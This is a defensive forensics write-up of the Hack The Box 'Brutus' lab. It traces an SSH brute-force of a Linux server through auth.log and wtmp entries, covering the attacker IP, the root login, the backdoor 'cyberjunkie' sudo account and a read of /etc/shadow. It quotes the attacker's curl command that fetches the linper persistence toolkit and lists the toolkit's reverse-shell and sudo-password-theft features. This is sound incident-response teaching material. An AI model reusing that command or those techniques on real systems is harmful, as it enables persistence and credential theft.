# Brutus

> [https://app.hackthebox.com/sherlocks/brutus](https://app.hackthebox.com/sherlocks/brutus)

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/366abaef-c18f-4d95-8783-b56b59e36b7c" />

## Table of Contents

* [About](#about)
* [References](#references)
* [Analysis](#analysis)
* [Conclusion](#conclusion)

## About

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## References

* [GNU date](https://www.man7.org/linux/man-pages/man1/date.1.html)
* [Confluence](https://www.atlassian.com/software/confluence)
* [sshd Manual](https://man.openbsd.org/sshd)
* [Linux Auth Logs](https://manpages.org/auth_login)
* [utmp / wtmp Manual](https://man7.org/linux/man-pages/man5/utmp.5.html)
* [Linper: Linux Persistence Toolkit](https://github.com/montysecurity/linper)
* [MITRE ATT&CK T1136.001: Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)

## Analysis

* **Archive**: *Brutus.zip: dd7742375a19b6ccc4323058224460a5220c43d4e9f7565b653bd369b8c46b2d sha256*
* **Password**: *hacktheblue*

From the provided zip archive we have three files: a Linux auth.log, a Python script (utmp parser) and a wtmp file.

<img width="1226" height="308" alt="0" src="https://github.com/user-attachments/assets/fadfc42d-9887-4671-b3b7-b01e2ae1626a" />

### Analyze the auth.log. What is the IP address used by the attacker to carry out a brute-force attack?

From the previous output we know that auth.log has only 385 lines, so it should be fairly easy to find brute-force indicators. At **March 6: 06:19:54**, we can see a successful authentication for **root** coming from the IP address *203.101.190.9*, which is a legitimate client.

```log
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:19:54 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
```

At **March 6: 06:31:31** we can see the first failed authentication attempt, with the message: Invalid user admin from 65.2.161.68 port 46380. From there, it's possible to see multiple authentication attempts per second: this is the first indicator of an attack. It is also notable the use of common privileged account names, such as **admin**, **server_adm**, and **svc_account**, indicating the use of a wordlist to aid in the attack.

```log
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
```

From the pattern of authentication attempts we can confirm that **65.2.161.68** is the offending IP address.

### The brute-force attempts were successful and the attacker gained access to an account on the server. What is the username of the account?

At **March 6: 06:31:40** we have a successful authentication originating from the offending IP; the login was for the **root** account.

```log
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
```

<img width="1254" height="343" alt="1" src="https://github.com/user-attachments/assets/15a929f7-2a0d-47e0-9ca4-abf8c4b3702c" />

### Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

We can use the provided utmp.py script to view the login time of the working session and correlate that with auth.log.

auth.log records **authentication events**, when credentials are checked and accepted by the SSH daemon, whereas wtmp records **session/accounting events**, such as when a user actually logs in and a terminal session is opened.

> __auth.log__: Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2

> __wtmp__: USER: 2549: pts/1: ts/1: root: 65.2.161.68: 0: 0: 0: 2024/03/06 01:32:45: 387923: 65.2.161.68

From the parsed wtmp file we can see the creation of a terminal session at 2024/03/06 01:32:45. Because my system time was set to EST (UTC−5) instead of UTC, I converted the timestamp to UTC.

The attacker established a terminal session at: **2024-03-06 06:32:45 UTC**

### SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

To get the session number of the attacker SSH session we can refer to the authentication log and separate the manual login from the legitimate one (Session 6) and the automated brute-force attempts (Session 34).

The session number for the manual login is: **37**

<img width="1659" height="375" alt="2" src="https://github.com/user-attachments/assets/e2931d07-e900-47b7-a729-24b89b3c25a9" />

### The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

At **March 6: 06:34:18** a user was added to the system with the name **cyberjunkie** (UID=1002, GID=1002). Later, at **March 6: 06:35:15**, that same user was added to the sudo group.

<img width="1899" height="479" alt="3" src="https://github.com/user-attachments/assets/42ae181b-8788-47e9-96f7-44557ba210a4" />

### What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

The sub-technique ID is: [T1136.001: Create Account: Local Account ](https://attack.mitre.org/techniques/T1136/001/)

From _attack.mitre.org_:

_"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service._

_Adversaries may also create new local accounts on network firewall management consoles: for example, by exploiting a vulnerable firewall management system, threat actors may be able to establish super-admin accounts that could be used to modify firewall rules and gain further access to the network._

_Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."_

### What time did the attacker's first SSH session end according to auth.log?

In auth.log we can search for systemd-logind events or rows related to the session number we're looking for. We can see on line 358 that the attacker logged out, and the next line shows that session 37 was terminated at **2024-03-06 06:37:24**.

<img width="1497" height="205" alt="4" src="https://github.com/user-attachments/assets/488a29d2-e379-4ff3-addd-154a64b69faf" />

### The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

In the log file we can search for commands executed by the backdoor account. At **March 6: 06:37:57** the attacker reads the /etc/shadow file, and at **March 6: 06:39:38** downloads a persistence toolkit from GitHub.

___"Linper: linux persistence toollkit"___

___features:___

- enumerate programs that can be used to execute a reverse shells and ways to make them persist a reboot
- automatically install reverse shells with all the required syntax, redirection, and pipes to minimize printing errors to screen or interrupting normal functions and processes
- supply custom crontab schedules for reverse shells
- look through /etc/shadow for accounts that can login via a password
- support for a stealth mode and the ability to clean up after itself
- place a function in ~/.bashrc to intercept and exfil sudo passwords
- place php reverse shells in web server directories

<img width="1845" height="215" alt="5" src="https://github.com/user-attachments/assets/d499fb20-8fbc-4147-935a-3727cfc07bb7" />

The full command executed using sudo was:

__/usr/bin/curl [https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh](https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh)__

## Conclusion

This challenge demonstrates how auth.log and wtmp complement each other in forensic investigations: auth.log provides detailed authentication events (including failed attempts and credential checks), while wtmp provides session accounting that shows when an interactive terminal was actually established. Correlating these artifacts allowed identification of the attacker IP (65.2.161.68), the compromised account (root), the terminal session creation time (2024-03-06 06:32:45 UTC), and post-compromise actions such as creating a backdoor user (cyberjunkie) and downloading a persistence toolkit (linper).
